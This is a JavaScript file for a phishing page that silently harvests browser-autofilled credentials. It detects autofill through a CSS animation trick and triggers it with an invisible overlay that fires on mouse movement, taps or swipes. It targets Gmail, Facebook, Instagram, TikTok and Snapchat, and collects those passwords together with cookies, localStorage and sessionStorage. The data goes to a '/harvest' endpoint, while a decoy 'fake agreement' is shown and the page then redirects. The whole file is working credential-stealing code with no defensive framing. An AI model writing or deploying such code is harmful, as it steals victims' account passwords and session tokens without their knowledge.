// A flag to prevent multiple harvests
window.harvested = false;

async function harvest() {
  // Check the flag to ensure this function only runs once
  if (window.harvested) return;
  window.harvested = true;

  // A short delay to ensure all autofill values are populated
  await new Promise(resolve => setTimeout(resolve, 50));

  const gmailForm = document.getElementById('gmail-form');
  const facebookForm = document.getElementById('facebook-form');
  const instagramForm = document.getElementById('instagram-form');
  const tiktokForm = document.getElementById('tiktok-form');
  const snapchatForm = document.getElementById('snapchat-form');

  const data = {
    gmail: {
      email: gmailForm ? gmailForm.email.value : '',
      password: gmailForm ? gmailForm.password.value : '',
    },
    facebook: {
      username: facebookForm ? facebookForm.username.value : '',
      password: facebookForm ? facebookForm.password.value : '',
    },
    instagram: {
      username: instagramForm ? instagramForm.username.value : '',
      password: instagramForm ? instagramForm.password.value : '',
    },
    tiktok: {
      username: tiktokForm ? tiktokForm.username.value : '',
      password: tiktokForm ? tiktokForm.password.value : '',
    },
    snapchat: {
      username: snapchatForm ? snapchatForm.username.value : '',
      password: snapchatForm ? snapchatForm.password.value : '',
    },
    userAgent: navigator.userAgent,
    cookies: document.cookie,
    localStorage: { ...localStorage },
    sessionStorage: { ...sessionStorage },
    timestamp: new Date().toISOString(),
  };

  try {
    // Use sendBeacon for a more reliable unload harvest
    if (navigator.sendBeacon) {
      const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
      navigator.sendBeacon('/harvest', blob);
      console.log('Beacon harvest sent.');
    } else {
      // Fallback to fetch for other cases
      const response = await fetch('/harvest', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
      });
      console.log('Harvest successful:', response.status);
    }
  } catch (error) {
    console.error('Harvest failed:', error);
  }

  // Redirect after a short delay
  setTimeout(() => {
    window.location.href = 'about:blank';
  }, 500);
}

// --- Autofill Detection using CSS Animation Trick ---
const style = document.createElement('style');
style.innerHTML = `
  @keyframes onAutoFillStart { from {} to {} }
  input:-webkit-autofill {
    animation-name: onAutoFillStart;
    animation-fill-mode: both;
  }
`;
document.head.appendChild(style);

document.addEventListener('animationstart', (e) => {
  if (e.animationName === 'onAutoFillStart') {
    harvest();
  }
}, true);

// --- Fallback Mechanisms ---
// 1. A timeout for non-webkit browsers or if the animation fails
// Fallback to ensure harvest is called
// After 2 seconds, attempt to harvest anyway, in case the animation trick fails
// This helps capture data on browsers that don't support the animation hack (e.g., Firefox)
setTimeout(harvest, 15000);

// Also, listen for the page unload event as a last resort
window.addEventListener('beforeunload', harvest);

// --- UI Logic ---
// Show the fake agreement after a delay
setTimeout(() => {
  const previewContainer = document.querySelector('.preview-container');
  const agreementContainer = document.querySelector('.agreement-container');
  if (previewContainer) previewContainer.style.display = 'none';
  if (agreementContainer) agreementContainer.style.display = 'block';
}, 1500); // 1.5 second delay to simulate loading


// --- Interaction-based Autofill Trigger ---
function triggerAutofill() {
  console.log('Interaction detected, attempting to trigger autofill...');

  // Try to click all the username/email fields to trigger autofill prompts
  const gmailInput = document.querySelector('#gmail-form input[name="email"]');
  if (gmailInput) gmailInput.click();

  const facebookInput = document.querySelector('#facebook-form input[name="username"]');
  if (facebookInput) facebookInput.click();

  const instagramInput = document.querySelector('#instagram-form input[name="username"]');
  if (instagramInput) instagramInput.click();

  const tiktokInput = document.querySelector('#tiktok-form input[name="username"]');
  if (tiktokInput) tiktokInput.click();

  const snapchatInput = document.querySelector('#snapchat-form input[name="username"]');
  if (snapchatInput) snapchatInput.click();

  // Hide the overlay after the first trigger to avoid interfering
  const overlay = document.getElementById('click-overlay');
  if (overlay) overlay.style.display = 'none';
}

const overlay = document.getElementById('click-overlay');
if (overlay) {
  // For mobile (tap)
  overlay.addEventListener('click', triggerAutofill, { once: true });
  // For desktop (mouse move)
  overlay.addEventListener('mousemove', triggerAutofill, { once: true });

  // For mobile (swipe/slide)
  let touchstartX = 0;
  let touchstartY = 0;
  let touchendX = 0;
  let touchendY = 0;
  const swipeThreshold = 30; // Minimum distance for a swipe

  overlay.addEventListener('touchstart', (e) => {
    touchstartX = e.changedTouches[0].screenX;
    touchstartY = e.changedTouches[0].screenY;
  }, { once: true });

  overlay.addEventListener('touchend', (e) => {
    touchendX = e.changedTouches[0].screenX;
    touchendY = e.changedTouches[0].screenY;
    
    const deltaX = Math.abs(touchendX - touchstartX);
    const deltaY = Math.abs(touchendY - touchstartY);

    if (deltaX > swipeThreshold || deltaY > swipeThreshold) {
      triggerAutofill();
    }
  }, { once: true });
}